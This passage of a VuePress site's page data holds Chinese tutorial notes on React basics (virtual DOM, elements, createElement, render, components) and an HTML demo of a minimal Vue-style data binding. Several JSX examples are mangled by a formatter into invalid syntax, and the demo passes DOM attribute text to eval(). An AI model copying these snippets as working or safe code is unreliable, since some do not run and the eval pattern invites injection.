https://github.com/facebook/react/blob/master/changelog.md\n\n\n# react是什么\n\nreact是facebook开发的一款用于构建用户界面的javascript库。所有的react应用的核心是 组件(component)。\n\n\n# 由谁开发\n\n * 起初由facebook 的软件工程师 jordan walke 创建。\n\n * 于2011年部署于facebook 的 newsfeed\n\n * 随后在2012年部署于instargram\n\n * 2013年5月开源。 ...\n\n\n# 组件化思想\n\nreact 的一个重要贡献——将基于组件的架构带到前端世界，react 并不是“组件”的发明者，但它的确在这领域深凿了一步。\n\n\n# 以 javascript 为中心\n\nreact 将 "html" 嵌入 js。用javascript语法去操作"html"。\n\n\n# 为什么需要react\n\nfacebook认为mvc无法满足他们的扩展需求，由于他们非常巨大的代码库和庞大的组织，使得mvc很快变得非常复复杂，每当需要添加一项新的功能或特性时，系统的复杂度就成级数增长，致使代码变得脆弱和不可预测，结果导致他们的mvc正在土崩瓦解。便认为mvc不适合大规模应用，当系统中有很多的模型和相应的视图时，其复杂度就会迅速扩大，非常难以理解和调试，特别是模型和视图间可能存在的双向数据流动。\n\n解决这个问题需要“以某种方式组织代码，使其更加可预测”，flux和react做到了这一点。flux是一种促进应用内数据单向流动的系统架构。据occhino介绍，react是一种用来构建“可控”和“声明式”的web用户接口的javascript框架，使得facebook可以更快的开发web应用。\n\n原生javascript 操作dom频繁，效率低。（dom-api操作ui）\n\n使用javascript 直接操作dom ，浏览器会大量的重绘重排。\n\n原生javascript 没有组件化编码方案，代码复用低。\n\n\n# react解决问题\n\n前端开发变得越来越复杂，其本质问题可归结于如何将来自于服务器端或者用户输入的动态数据高效的反映到复杂的用户界面上。\n\n\n                         现阶段问题          react解决方案\n                        ┌──────────┐      ┌──────────┐\n                        │          │      │          │\n                     ┌──┤频繁dom操作├──────┤自动dom操作│\n   ┌──────────┐      │  │          │      │          │\n   │          │      │  └──────────┘      └──────────┘\n   │datachange├──────┤   \n   │          │      │  ┌──────────┐      ┌──────────┐\n   └──────────┘      │  │          │      │          │\n                     └──┤逻辑极复杂 ├──────┤ 状态&属性 │\n                        │          │      │          │\n                        └──────────┘      └──────────┘\n\n\n\n采用组件化模式，声明式编码，提高开发效率及组件复用率。\n\nreact native 编写原生应用 移动端开发。\n\n高效（优秀的diffing算法 使用虚拟dom）避免于真实dom 接触。\n\n\n# react设计哲学\n\n从设计哲学来讲，react 的整个设计思想其实非常简单：\n\n                  data  -> view\nconst component = props => reactelement\n\n\n再概括一下就是：\n\ndata => view\n\n\n> 简而言之就是：数据到视图的映射。\n\n\n# react特点\n\n 1. 声明式设计[1]：自动dom操作(react自动完成)\n\n * 高效：通过虚拟dom(virtual dom)，最大限度的减少与dom的交互提高效率\n * 灵活：可以与已知的框架或库很好的配合\n * jsx：javascript语法的扩展，可以不使用，但建议使用\n * 组件：构建组件，使代码更容易得到复用，能够很好地应用在大项目的开发中\n * 单向数据流：react实现了单向响应的数据流，从而减少了重复代码，使得比传统数据绑定更简单\n\n\n# virtual dom\n\n> react 使用 virtual dom 来更新真正的 dom，从而提高效率和速度。\n\n在web开发中，我们总需要将变化的数据实时展示到视图上，这时就需要对dom进行操作，而复杂或频繁的dom操作通常是性能瓶颈产生的原因（如何进行高性能的复杂dom操作通常是衡量一个前端开发人员技能的重要指标）。\n\nreact为此引入了虚拟dom（virtual dom）的机制：在浏览器端用javascript实现了一套dom api。因为 dom 操作是真的很慢，所以我们永远不会直接用 react 修改 dom，而是修改内存中的虚拟 dom。\n\n\n# 直接操作dom\n\n真实页面对应一个 dom 树。在传统页面的开发模式中，每次需要更新页面时，都要手动操作 dom 来进行更新\n\ndom 操作非常昂贵。我们都知道在前端开发中，性能消耗最大的就是 dom 操作，而且这 部分代码会让整体项目的代码变得难以维护。react 把真实 dom 树转换成 javascript 对象树，也 就是 virtual dom\n\n\n# virtual dom\n\n操作虚拟 dom 非常快，当时机合适时，react 负责更新真实 dom。它通过比较虚拟 dom 和真实 dom 之间的差别，查明哪个改变很重要，然后在一个称为 reconciliation 的过程中作出最少量的 dom 改变，以确保一切保持最新。\n\n> 简单说， 每次数据更新后，重新计算 virtual dom，并和上一次生成的 virtual dom 做对比，对发生 变化的部分做批量更新。\n\n\n# react组件化\n\n> 创建好拥有各自状态的组件，再由组件构成更加复杂的界面。\n\ncomponent，中文成为 组件 即将实现页面某一部分功能的结构、样式和逻辑封装成为一个整体，使其高内聚，低耦合，达到分治与复用的目的。组件化设计的目的是提高代码的复用，降低测试难度，代码复杂度。\n\n组件 是react中构建用户界面的基本单位。组件化的工作方式信奉独立、完整、自由组合。目标就是尽可能把设计与开发中的元素独立化，使它具备完整的局部功能，通过自由组合来构成整个产品。\n\nreact 鼓励我们将视觉元素分为更小的组件，而不是一整大块：\n\nreact认为一个组件应该具有如下特征：\n\n * 可组合（composeable）：一个组件易于和其它组件一起使用，或者嵌套在另一个组件内部，一个复杂的ui可以拆分成多个简单的ui组件；\n * 可重用（reusable）：每个组件都是具有独立功能的，它可以被使用在多个ui场景；\n * 可维护（maintainable）：每个小的组件仅仅包含自身的逻辑，更容易被理解和维护；\n\n\n# 浏览器支持\n\nreact 支持所有的现代浏览器，包括 ie9 及以上版本，但是需要为旧版浏览器比如 ie9 和 ie10 引入相关的 polyfills 赖依。\n\nreact 16 依赖集合类型 map 和 set 。如果你要支持无法原生提供这些能力（例如 ie < 11）或实现不规范（例如 ie 11）的旧浏览器与设备，考虑在你的应用库中包含一个全局的 polyfill ，例如 core-js 或 babel-polyfill 。\n\n\n# 附录\n\n\n# [1]什么是声明式编程\n\n声明式编程是一种编程范式，它关注的是你要做什么，而不是如何做。它表达逻辑而不显式地定义步骤。这意味着我们需要根据逻辑的计算来声明要显示的组件。它没有描述控制流步骤。声明式编程的例子有html、sql等\n\nhtml file\n\n// html\n<div>\n  <p>declarative programming</p>\n</div>\n\n\nsql file\n\nselect * from studens where firstname = \'declarative\';\n\n\n\n# 声明式编程 vs 命令式编程\n\n声明式编程的编写方式描述了应该做什么，而命令式编程描述了如何做。在声明式编程中，让编译器决定如何做事情。声明性程序很容易推理，因为代码本身描述了它在做什么。\n\n\n# 参考\n\n * https://juejin.im/post/5cf0733de51d4510803ce34e#heading-9\n * https://www.optbbs.com/thread-2050391-1-1.html',charsets:{cjk:!0}},{title:"React元素",frontmatter:{},regularPath:"/React/React%E5%9F%BA%E7%A1%80/00-React%E5%85%83%E7%B4%A0.html",relativePath:"React/React基础/00-React元素.md",key:"v-dcd37ecc",path:"/React/React%E5%9F%BA%E7%A1%80/00-React%E5%85%83%E7%B4%A0.html",headers:[{level:2,title:"什么是React元素",slug:"什么是react元素",normalizedTitle:"什么是react元素",charIndex:38},{level:2,title:"React 元素分类",slug:"react-元素分类",normalizedTitle:"react 元素分类",charIndex:668}],headersStr:"什么是React元素 React 元素分类",content:"# React元素\n\n> 元素是构成 React 应用的最小单位。\n\n\n# 什么是React元素\n\n> React元素与DOM元素不同，React 当中的元素事实上是普通的对象，React DOM 可以确保 浏览器 DOM 的数据内容与 React 元素保持一致。\n\nReact 元素其实就是一个简单JavaScript对象，一个React 元素和界面上的一部分DOM对应，描述了这部分DOM的结构及渲染效果。\n\n一般我们通过JSX语法创建React 元素，例如：\n\nconst element = <h1 className='greeting'>Hello, world</h1>;\n\n\nelement是一个React 元素。在编译环节，JSX 语法会被编译成对React.createElement()的调用，从这个函数名上也可以看出，JSX语法返回的是一个React 元素。上面的例子编译后的结果为：\n\nconst element = React.createElement(\n    'h1',\n    {className: 'greeting'},\n    'Hello, world!'\n);\n\n\n最终，element的值是类似下面的一个简单JavaScript对象：\n\nconst element = {\n    type: 'h1',\n    props: {\n        className: 'greeting',\n        children: 'Hello, world'\n    }\n}\n\n\n\n# React 元素分类\n\nReact 元素可以分为两类：\n\n序号   类型         描述\n1    DOM类型的元素   DOM类型的元素使用像h1、div、p等DOM节点创建React 元素，前面的例子就是一个DOM类型的元素\n2    组件类型的元素    组件类型的元素使用React 组件创建React 元素\n\n例如：\n\nconst ButtonElement = <Button color='green'>确认</Button>;\n\n\nButtonElement就是一个组件类型的元素，它的值是：\n\nconst ButtonElement = {\n    type: 'Button',\n    props: {\n        color: 'green',\n        children: '确认'\n    }\n}\n\n\n对于DOM类型的元素，因为和页面的DOM节点直接对应，所以React知道如何进行渲染。但是对于组件类型的元素，如buttonElement，React是无法直接知道应该把buttonElement渲染成哪种结构的页面DOM，这时就需要组件自身提供React能够识别的DOM节点信息，具体实现方式在介绍组件时会详细介绍。\n\n有了React 元素，我们应该如何使用它呢？其实，绝大多数情况下，我们都不会直接使用React 元素，React 内部会自动根据React 元素，渲染出最终的页面DOM。更确切地说，React元素描述的是React虚拟DOM的结构，React会根据虚拟DOM渲染出页面的真实DOM。",normalizedContent:"# react元素\n\n> 元素是构成 react 应用的最小单位。\n\n\n# 什么是react元素\n\n> react元素与dom元素不同，react 当中的元素事实上是普通的对象，react dom 可以确保 浏览器 dom 的数据内容与 react 元素保持一致。\n\nreact 元素其实就是一个简单javascript对象，一个react 元素和界面上的一部分dom对应，描述了这部分dom的结构及渲染效果。\n\n一般我们通过jsx语法创建react 元素，例如：\n\nconst element = <h1 classname='greeting'>hello, world</h1>;\n\n\nelement是一个react 元素。在编译环节，jsx 语法会被编译成对react.createelement()的调用，从这个函数名上也可以看出，jsx语法返回的是一个react 元素。上面的例子编译后的结果为：\n\nconst element = react.createelement(\n    'h1',\n    {classname: 'greeting'},\n    'hello, world!'\n);\n\n\n最终，element的值是类似下面的一个简单javascript对象：\n\nconst element = {\n    type: 'h1',\n    props: {\n        classname: 'greeting',\n        children: 'hello, world'\n    }\n}\n\n\n\n# react 元素分类\n\nreact 元素可以分为两类：\n\n序号   类型         描述\n1    dom类型的元素   dom类型的元素使用像h1、div、p等dom节点创建react 元素，前面的例子就是一个dom类型的元素\n2    组件类型的元素    组件类型的元素使用react 组件创建react 元素\n\n例如：\n\nconst buttonelement = <button color='green'>确认</button>;\n\n\nbuttonelement就是一个组件类型的元素，它的值是：\n\nconst buttonelement = {\n    type: 'button',\n    props: {\n        color: 'green',\n        children: '确认'\n    }\n}\n\n\n对于dom类型的元素，因为和页面的dom节点直接对应，所以react知道如何进行渲染。但是对于组件类型的元素，如buttonelement，react是无法直接知道应该把buttonelement渲染成哪种结构的页面dom，这时就需要组件自身提供react能够识别的dom节点信息，具体实现方式在介绍组件时会详细介绍。\n\n有了react 元素，我们应该如何使用它呢？其实，绝大多数情况下，我们都不会直接使用react 元素，react 内部会自动根据react 元素，渲染出最终的页面dom。更确切地说，react元素描述的是react虚拟dom的结构，react会根据虚拟dom渲染出页面的真实dom。",charsets:{cjk:!0}},{title:"ReactAPI",frontmatter:{},regularPath:"/React/React%E5%9F%BA%E7%A1%80/01-ReactApi.html",relativePath:"React/React基础/01-ReactApi.md",key:"v-b7eec8c0",path:"/React/React%E5%9F%BA%E7%A1%80/01-ReactApi.html",headers:[{level:2,title:"React.createElement()",slug:"react-createelement",normalizedTitle:"react.createelement()",charIndex:68},{level:2,title:"ReactDOM.render()方法",slug:"reactdom-render-方法",normalizedTitle:"reactdom.render()方法",charIndex:813},{level:2,title:"定义组件",slug:"定义组件",normalizedTitle:"定义组件",charIndex:1306},{level:3,title:"函数定义组件",slug:"函数定义组件",normalizedTitle:"函数定义组件",charIndex:1419},{level:3,title:"类定义组件",slug:"类定义组件",normalizedTitle:"类定义组件",charIndex:1746},{level:2,title:"组件渲染",slug:"组件渲染",normalizedTitle:"组件渲染",charIndex:1099}],headersStr:"React.createElement() ReactDOM.render()方法 定义组件 函数定义组件 类定义组件 组件渲染",content:"# ReactAPI\n\nReact 中一切都是组件。我们通常将应用程序的整个逻辑分解为小的单个部分。元素是构成组件的一个部分。\n\n\n# React.createElement()\n\nReact.createElement() 方法创建并返回一个给定类型的React元素。\n\nReact.createElement(\n    type,\n    [props],\n    [...children]\n)\n\n\n参数            必选   描述\ntype          是    标签名（如'div'or 'span'）, React组件\nprops         否    对象/null，该标签的属性\n...children   否    该元素的子节点\n\n创建React元素\n\nvar li1 = React.createElement('li', {className:'text'}, 'First Text Content');\nvar li2 = React.createElement('li', null, 'Second Text Content');\nvar li3 = React.createElement('li', null, 'Third Text Content');\nvar uls = React.createElement('ul', { className: 'list' }, li1, li2, li3);\n\n\nReact.createElement() 方法的返回值是类似下面的一个简单JavaScript对象：\n\nconst element = {\n    type: 'li',\n    props: {\n        className: 'text',\n        children: 'First Text Content'\n    }\n}\n\n\n\n# ReactDOM.render()方法\n\n基本语法\n\nReactDOM.render(component | element, DOM, callback)\n\n\nReactDOM.render() 是 React 的最基本方法, 用于将组件或元素转为HTML, 并插入指定的 DOM 节点。\n\n渲染组件到指定位置 render 方法带有三个参数：\n\n参数                  描述\ncomponent/element   要渲染的元素 或 组件\nDOM                 组件或元素渲染到指定DOM位置\nfunction(){}        组件渲染完成后回调函数\n\n示例\n\nReactDOM.render( <\n    h2 > hello world! < /h2>,/ / html模板 document.getElementById('container'), //要插入到container这个节点中\n    function() {\n        console.log('渲染完成'); //渲染完成 输出此文本\n    }\n)\n\n\n\n# 定义组件\n\n> React组件和React元素关系密切，React组件最核心的作用是返回React元素。\n\n在React中定义组件方式主要有两种：\n\n * 函数式定义的无状态组件\n * ES6 Class 定义的组件\n\n\n# 函数定义组件\n\n定义一个组件最简单的方式是使用JavaScript函数：\n\nfunction Welcome(props) {\n    return <h1 > Hello, {\n        props.name\n    } < /h1>;\n}\n\n\n该函数是一个有效的React组件，它接收一个单一的“props”对象并返回了一个React元素。我们之所以称这种类型的组件为函数定义组件，是因为从字面上来看，它就是一个JavaScript函数。\n\nWelcome组件返回的React 元素为：\n\n{\n    type: 'h1',\n    props: {\n        children: 'Hello, React'\n    }\n}\n\n\n\n# 类定义组件\n\n# ES6语法\nclass Welcome extends React.Component {\n    render() {\n        return <h1 > Hello, {\n            this.props.name\n        } < /h1>;\n    }\n}\n\n\n> ⚠️警告:\n\n 1. 创建组件方法必写参数 render方法\n\n * 返回组件名第一字母大写(驼峰)\n\n在React V16中，render方法支持直接返回string，number，boolean，null，portal，以及fragments(带有key属性的数组)，这可以在一定程度上减少页面的DOM层级。\n\n//element\nrender(){\n\treturn <div></div>\n}\n//string\nrender(){\n\treturn 'hello,world'\n}\n\n//number\nrender(){\n\treturn 12345\n}\n\n//boolean\nrender(){\n\treturn isTrue?true:false\n}\n\n//null\nrender(){\n\treturn null\n}\n\n//fragments，未加key标识符，控制台会出现warning\nrender(){\n\treturn [\n    \t<div>hello</div>,\n    \t<span>world</span>,\n    \t<p>oh</p>\n\t]\n}\n\n\n以上各种类型现在均可以直接在render中返回，不需要再在外层包裹一层容器元素，不过在返回的数组类型中，需要在每个元素上加一个唯一且不变的key值，否则控制台会报一个warning。\n\n\n# 组件渲染\n\n# ES6语法\nclass Welcome extends React.Component {\n    render() {\n        return <h1 > Hello, {\n            this.props.name\n        } < /h1>;\n    }\n}\n\n# 渲染组件语法与普通dom一致\nReactDOM.render(<Welcome name='King'/>,document.querySelector('#app'))\n\n\n这个例子中发生了什么：\n\n 1. 我们对<Welcome name='King' />元素调用了ReactDOM.render()方法。\n\n * React将{name: 'King'}作为props传入并调用Welcome组件。\n * Welcome组件将<h1>Hello, King</h1>元素作为结果返回。\n * React DOM将DOM更新为<h1>Hello, King</h1>。\n\n> ⚠️警告:\n\n组件名称必须以大写字母开头。\n例如，\n\n表示一个DOM标签，但 表示一个组件，并且在使用该组件时你必须定义或引入它。\n\n\n\n示例\n\nclass Title extends React.Component {\n    render() {\n        return ( <\n            div >\n            <\n            h3 > Hello world! < /h3> <\n            /div>\n        )\n    }\n}\nReactDOM.render( < Title / > , document.querySelector('#app'))\n",normalizedContent:"# reactapi\n\nreact 中一切都是组件。我们通常将应用程序的整个逻辑分解为小的单个部分。元素是构成组件的一个部分。\n\n\n# react.createelement()\n\nreact.createelement() 方法创建并返回一个给定类型的react元素。\n\nreact.createelement(\n    type,\n    [props],\n    [...children]\n)\n\n\n参数            必选   描述\ntype          是    标签名（如'div'or 'span'）, react组件\nprops         否    对象/null，该标签的属性\n...children   否    该元素的子节点\n\n创建react元素\n\nvar li1 = react.createelement('li', {classname:'text'}, 'first text content');\nvar li2 = react.createelement('li', null, 'second text content');\nvar li3 = react.createelement('li', null, 'third text content');\nvar uls = react.createelement('ul', { classname: 'list' }, li1, li2, li3);\n\n\nreact.createelement() 方法的返回值是类似下面的一个简单javascript对象：\n\nconst element = {\n    type: 'li',\n    props: {\n        classname: 'text',\n        children: 'first text content'\n    }\n}\n\n\n\n# reactdom.render()方法\n\n基本语法\n\nreactdom.render(component | element, dom, callback)\n\n\nreactdom.render() 是 react 的最基本方法, 用于将组件或元素转为html, 并插入指定的 dom 节点。\n\n渲染组件到指定位置 render 方法带有三个参数：\n\n参数                  描述\ncomponent/element   要渲染的元素 或 组件\ndom                 组件或元素渲染到指定dom位置\nfunction(){}        组件渲染完成后回调函数\n\n示例\n\nreactdom.render( <\n    h2 > hello world! < /h2>,/ / html模板 document.getelementbyid('container'), //要插入到container这个节点中\n    function() {\n        console.log('渲染完成'); //渲染完成 输出此文本\n    }\n)\n\n\n\n# 定义组件\n\n> react组件和react元素关系密切，react组件最核心的作用是返回react元素。\n\n在react中定义组件方式主要有两种：\n\n * 函数式定义的无状态组件\n * es6 class 定义的组件\n\n\n# 函数定义组件\n\n定义一个组件最简单的方式是使用javascript函数：\n\nfunction welcome(props) {\n    return <h1 > hello, {\n        props.name\n    } < /h1>;\n}\n\n\n该函数是一个有效的react组件，它接收一个单一的“props”对象并返回了一个react元素。我们之所以称这种类型的组件为函数定义组件，是因为从字面上来看，它就是一个javascript函数。\n\nwelcome组件返回的react 元素为：\n\n{\n    type: 'h1',\n    props: {\n        children: 'hello, react'\n    }\n}\n\n\n\n# 类定义组件\n\n# es6语法\nclass welcome extends react.component {\n    render() {\n        return <h1 > hello, {\n            this.props.name\n        } < /h1>;\n    }\n}\n\n\n> ⚠️警告:\n\n 1. 创建组件方法必写参数 render方法\n\n * 返回组件名第一字母大写(驼峰)\n\n在react v16中，render方法支持直接返回string，number，boolean，null，portal，以及fragments(带有key属性的数组)，这可以在一定程度上减少页面的dom层级。\n\n//element\nrender(){\n\treturn <div></div>\n}\n//string\nrender(){\n\treturn 'hello,world'\n}\n\n//number\nrender(){\n\treturn 12345\n}\n\n//boolean\nrender(){\n\treturn istrue?true:false\n}\n\n//null\nrender(){\n\treturn null\n}\n\n//fragments，未加key标识符，控制台会出现warning\nrender(){\n\treturn [\n    \t<div>hello</div>,\n    \t<span>world</span>,\n    \t<p>oh</p>\n\t]\n}\n\n\n以上各种类型现在均可以直接在render中返回，不需要再在外层包裹一层容器元素，不过在返回的数组类型中，需要在每个元素上加一个唯一且不变的key值，否则控制台会报一个warning。\n\n\n# 组件渲染\n\n# es6语法\nclass welcome extends react.component {\n    render() {\n        return <h1 > hello, {\n            this.props.name\n        } < /h1>;\n    }\n}\n\n# 渲染组件语法与普通dom一致\nreactdom.render(<welcome name='king'/>,document.queryselector('#app'))\n\n\n这个例子中发生了什么：\n\n 1. 我们对<welcome name='king' />元素调用了reactdom.render()方法。\n\n * react将{name: 'king'}作为props传入并调用welcome组件。\n * welcome组件将<h1>hello, king</h1>元素作为结果返回。\n * react dom将dom更新为<h1>hello, king</h1>。\n\n> ⚠️警告:\n\n组件名称必须以大写字母开头。\n例如，\n\n表示一个dom标签，但 表示一个组件，并且在使用该组件时你必须定义或引入它。\n\n\n\n示例\n\nclass title extends react.component {\n    render() {\n        return ( <\n            div >\n            <\n            h3 > hello world! < /h3> <\n            /div>\n        )\n    }\n}\nreactdom.render( < title / > , document.queryselector('#app'))\n",charsets:{cjk:!0}},{frontmatter:{},regularPath:"/Javascript/Javascript%E6%89%A9%E5%B1%95%E6%93%8D%E4%BD%9C/%E7%AE%80%E5%8D%95vue%E5%AE%9E%E7%8E%B0.html",relativePath:"Javascript/Javascript扩展操作/简单vue实现.md",key:"v-186b330c",path:"/Javascript/Javascript%E6%89%A9%E5%B1%95%E6%93%8D%E4%BD%9C/%E7%AE%80%E5%8D%95vue%E5%AE%9E%E7%8E%B0.html",headersStr:null,content:'<!DOCTYPE html>\n<html lang="en">\n\n<head>\n  <meta charset="UTF-8">\n  <meta name="viewport" content="width=device-width, initial-scale=1.0">\n  <meta http-equiv="X-UA-Compatible" content="ie=edge">\n  <title>简单vue的实现</title>\n</head>\n\n<body>\n  <div id="app">\n    {{name}}\n    {{text.name}}\n    <p v-if="isShow">\n      <span>{{name}}</span>\n    </p>\n    <input type="text" id="a" v-model="name">\n\n  </div>\n\n  <script>\n\n    function compile(node, vm) {\n\n      var reg = /\\{\\{(.*)\\}\\}/;                 //正则验证双大括号\n      if (node.nodeType === 1) {               //元素节点\n        var attr = Array.from(node.attributes);       \n        //解析属性\n        for (var i = 0; i < attr.length; i++) {      //遍历元素上的属性，查找特殊的属性，比如v-model和v-if\n          if (attr[i].nodeName == \'v-model\') {\n            var name = attr[i].nodeValue;\n            node.addEventListener(\'input\', function (e) {\n\n              vm[name] = e.target.value;\n              //eval(`vm.data.${name}=e.target.value`)\n              console.log(vm)\n            })\n            node.value = eval(`vm.${name}`);\n            node.removeAttribute(\'v-model\');\n          }\n          if (attr[i].nodeName == \'v-if\') {\n            var name = attr[i].nodeValue;\n            var isInsert = eval(`vm.${name}`);\n            if (!isInsert) {\n              node = \'\';\n              return node;\n            } else {\n              node.removeAttribute(\'v-if\');\n            }\n\n          }\n        }\n\n      }\n      if (node.nodeType === 3) {              //文本节点        \n        if (reg.test(node.nodeValue)) {        //正则验证节点内容是否符合双大括号包裹\n          var name = RegExp.$1;          //name是双大括号包裹内容\n          //RegExp.$n是非标准的，尽量不要在生产环境中使用。    \n          //RegExp.$n（n为1-9之间的数值）指的是与正则表达式匹配的第n个 子匹配(以括号为标志)字符串。\n          //RegExp.$_与正则表达式匹配的完整字符串。\n          name = name.trim();\n          //node.nodeValue = eval(`vm.data.${name}`);\n          new Watcher(vm, node, name)//这里给每个属性文本节点生成一个Watcher对象，嗯，大致跟vue的原理相似\n        }\n      }\n      return node;\n    }\n\n    function nodeToFragment(node, vm) {\n      var flag = document.createDocumentFragment();     \n      var child;\n\n      while (child = node.firstChild) {\n        child = compile(child, vm)\n        if (child !== "") {\n          if (child.childNodes.length != 0) {\n            child.append(nodeToFragment(child, vm));\n          }\n        } else {\n          node.removeChild(node.firstChild)\n        }\n\n        flag.append(child);\n      }\n      return flag;\n    }\n\n    function defineReactive(obj, key, val) {\n      var dep = new Dep();//这里给每个属性生成一个数据订阅中心，它可以存储订阅它的所有watcher,\n      Object.defineProperty(obj, key, {                //实现双向数据绑定\n        get: function () {                             //get获取数据\n          if (Dep.target) dep.addSub(Dep.target);//这里的Dep.target是对应的Watcher对象，这里是dep对象调用addSub\n          return val;\n        },\n        set: function (newVal) {                    //set设置数据\n          if (newVal === val) return;\n          console.log(\'修改了\', key)\n\n          val = newVal;\n          dep.notify();//数据更新了，就通知所有的观察者实例\n        }\n      })\n    }\n\n    function observer(obj, vm) {                         //遍历obj对象的属性\n      Object.keys(obj).forEach(function (key) {\n        defineReactive(vm, key, obj[key]);\n      })\n    }\n\n    function Watcher(vm, node, name) {\n      Dep.target = this;//在实例化新的watcher对象时把Dep.target赋值为this，也就是每个指令对应的那个watcher对象，这样在下面调用this.update,从而调用this.get时触发数据的get方法，从而触发dep.addSub（Dep.target）,这样这个watcher就被添加进去\n      this.name = name;\n      this.node = node;\n      this.vm = vm;\n      this.update();\n      Dep.target = null;  //为了保证全局只有一个，在最后需要清空，为下一个指令做准备\n    }\n    Watcher.prototype = {\n      update: function () {\n        this.get();//更新时调用get()\n        this.node.nodeValue = this.value;\n\n      },\n      get: function () {\n        this.value = this.vm[this.name]; //会触发vm.data中属性的get方法，进而可以添加watcher到Dep中\n      }\n    }\n\n    function Dep() {\n      this.subs = [];\n    }\n    Dep.prototype = {\n      addSub: function (sub) {\n        this.subs.push(sub);\n      },\n      notify: function () {\n        this.subs.forEach(function (sub) {\n          sub.update();\n        })\n      }\n    }\n\n    function Vue(options) {\n      this.data = options.data;\n      var id = options.el;\n      var data = this.data;\n      observer(data, this)             //遍历data对象的属性\n      var dom = nodeToFragment(document.getElementById(id), this);\n      document.getElementById(id).appendChild(dom);     \n    }\n\n\n\n\n   //简单操作\n    var vm = new Vue({\n      el: \'app\',\n      data: {\n        text: {\n          name: \'byk\'\n        },\n        \'name\': \'vue\',\n        isShow: true\n      }\n    })\n\n  <\/script>\n</body>\n\n</html>\n',normalizedContent:'<!doctype html>\n<html lang="en">\n\n<head>\n  <meta charset="utf-8">\n  <meta name="viewport" content="width=device-width, initial-scale=1.0">\n  <meta http-equiv="x-ua-compatible" content="ie=edge">\n  <title>简单vue的实现</title>\n</head>\n\n<body>\n  <div id="app">\n    {{name}}\n    {{text.name}}\n    <p v-if="isshow">\n      <span>{{name}}</span>\n    </p>\n    <input type="text" id="a" v-model="name">\n\n  </div>\n\n  <script>\n\n    function compile(node, vm) {\n\n      var reg = /\\{\\{(.*)\\}\\}/;                 //正则验证双大括号\n      if (node.nodetype === 1) {               //元素节点\n        var attr = array.from(node.attributes);       \n        //解析属性\n        for (var i = 0; i < attr.length; i++) {      //遍历元素上的属性，查找特殊的属性，比如v-model和v-if\n          if (attr[i].nodename == \'v-model\') {\n            var name = attr[i].nodevalue;\n            node.addeventlistener(\'input\', function (e) {\n\n              vm[name] = e.target.value;\n              //eval(`vm.data.${name}=e.target.value`)\n              console.log(vm)\n            })\n            node.value = eval(`vm.${name}`);\n            node.removeattribute(\'v-model\');\n          }\n          if (attr[i].nodename == \'v-if\') {\n            var name = attr[i].nodevalue;\n            var isinsert = eval(`vm.${name}`);\n            if (!isinsert) {\n              node = \'\';\n              return node;\n            } else {\n              node.removeattribute(\'v-if\');\n            }\n\n          }\n        }\n\n      }\n      if (node.nodetype === 3) {              //文本节点        \n        if (reg.test(node.nodevalue)) {        //正则验证节点内容是否符合双大括号包裹\n          var name = regexp.$1;          //name是双大括号包裹内容\n          //regexp.$n是非标准的，尽量不要在生产环境中使用。    \n          //regexp.$n（n为1-9之间的数值）指的是与正则表达式匹配的第n个 子匹配(以括号为标志)字符串。\n          //regexp.$_与正则表达式匹配的完整字符串。\n          name = name.trim();\n          //node.nodevalue = eval(`vm.data.${name}`);\n          new watcher(vm, node, name)//这里给每个属性文本节点生成一个watcher对象，嗯，大致跟vue的原理相似\n        }\n      }\n      return node;\n    }\n\n    function nodetofragment(node, vm) {\n      var flag = document.createdocumentfragment();     \n      var child;\n\n      while (child = node.firstchild) {\n        child = compile(child, vm)\n        if (child !== "") {\n          if (child.childnodes.length != 0) {\n            child.append(nodetofragment(child, vm));\n          }\n        } else {\n          node.removechild(node.firstchild)\n        }\n\n        flag.append(child);\n      }\n      return flag;\n    }\n\n    function definereactive(obj, key, val) {\n      var dep = new dep();//这里给每个属性生成一个数据订阅中心，它可以存储订阅它的所有watcher,\n      object.defineproperty(obj, key, {                //实现双向数据绑定\n        get: function () {                             //get获取数据\n          if (dep.target) dep.addsub(dep.target);//这里的dep.target是对应的watcher对象，这里是dep对象调用addsub\n          return val;\n        },\n        set: function (newval) {                    //set设置数据\n          if (newval === val) return;\n          console.log(\'修改了\', key)\n\n          val = newval;\n          dep.notify();//数据更新了，就通知所有的观察者实例\n        }\n      })\n    }\n\n    function observer(obj, vm) {                         //遍历obj对象的属性\n      object.keys(obj).foreach(function (key) {\n        definereactive(vm, key, obj[key]);\n      })\n    }\n\n    function watcher(vm, node, name) {\n      dep.target = this;//在实例化新的watcher对象时把dep.target赋值为this，也就是每个指令对应的那个watcher对象，这样在下面调用this.update,从而调用this.get时触发数据的get方法，从而触发dep.addsub（dep.target）,这样这个watcher就被添加进去\n      this.name = name;\n      this.node = node;\n      this.vm = vm;\n      this.update();\n      dep.target = null;  //为了保证全局只有一个，在最后需要清空，为下一个指令做准备\n    }\n    watcher.prototype = {\n      update: function () {\n        this.get();//更新时调用get()\n        this.node.nodevalue = this.value;\n\n      },\n      get: function () {\n        this.value = this.vm[this.name]; //会触发vm.data中属性的get方法，进而可以添加watcher到dep中\n      }\n    }\n\n    function dep() {\n      this.subs = [];\n    }\n    dep.prototype = {\n      addsub: function (sub) {\n        this.subs.push(sub);\n      },\n      notify: function () {\n        this.subs.foreach(function (sub) {\n          sub.update();\n        })\n      }\n    }\n\n    function vue(options) {\n      this.data = options.data;\n      var id = options.el;\n      var data = this.data;\n      observer(data, this)             //遍历data对象的属性\n      var dom = nodetofragment(document.getelementbyid(id), this);\n      document.getelementbyid(id).appendchild(dom);     \n    }\n\n\n\n\n   //简单操作\n    var vm = new vue({\n      el: \'app\',\n      data: {\n        text: {\n          name: \'byk\'\n        },\n        \'name\': \'vue\',\n        isshow: true\n      }\n    })\n\n  <\/script>\n</body>\n\n</html>\n',charsets:{cjk:!0}},{title:"React样式",frontmatter:{},regularPath:"/React/React%E5%9F%BA%E7%A1%80/04-React%E6%A0%B7%E5%BC%8F.html",relativePath:"React/React基础/04-React样式.md",key:"v-05ecbe92",path:"/React/React%E5%9F%BA%E7%A1%80/04-React%E6%A0%B7%E5%BC%8F.html",headers:[{level:2,title:"React使用样式两种方式",slug:"react使用样式两种方式",normalizedTitle:"react使用样式两种方式",charIndex:388},{level:3,title:"绑定样式到style属性",slug:"绑定样式到style属性",normalizedTitle:"绑定样式到style属性",charIndex:439},{level:3,title:"类名方式添加样式",slug:"类名方式添加样式",normalizedTitle:"类名方式添加样式",charIndex:737},{level:2,title:"React样式技巧",slug:"react样式技巧",normalizedTitle:"react样式技巧",charIndex:938},{level:3,title:"样式中的像素值",slug:"样式中的像素值",normalizedTitle:"样式中的像素值",charIndex:952}],headersStr:"React使用样式两种方式 绑定样式到style属性 类名方式添加样式 